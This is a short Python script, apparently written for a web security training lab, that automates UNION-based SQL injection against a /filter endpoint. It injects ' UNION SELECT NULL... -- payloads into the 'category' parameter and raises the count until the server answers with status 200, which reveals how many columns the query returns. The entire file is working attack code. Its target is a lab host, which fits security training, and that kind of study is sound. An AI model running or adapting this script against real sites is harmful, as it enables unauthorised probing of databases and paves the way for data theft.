import requests
import sys

# --- CONFIGURATION ---
BASE_URL = "https://0adf002c03d5d51e83f3a529006c0030.web-security-academy.net"
PATH = "/filter"
TARGET_URL = BASE_URL + PATH

# --- FUNCTIONS ---
def find_column_count(url):
    """
    Determines the number of columns by injecting UNION SELECT NULL...
    Returns the integer count if found, or None if failed.
    """
    print(f"[*] Probing column count at {url}...")
    
    # We loop from 1 to 50. If a table has more than 50 columns, 
    # we probably shouldn't be attacking it blindly!
    for i in range(1, 50):
        # Create payload: ' UNION SELECT NULL, NULL, NULL -- 
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        
        # Print progress on the same line to keep terminal clean
        sys.stdout.write(f"\r[~] Trying {i} columns...")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            print(f"\n[+] SUCCESS: The query returns {i} columns.")
            return i
            
    print("\n[-] FAILED: Could not determine column count.")
    return None

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # In the future, we can just call this function!
    num_columns = find_column_count(TARGET_URL)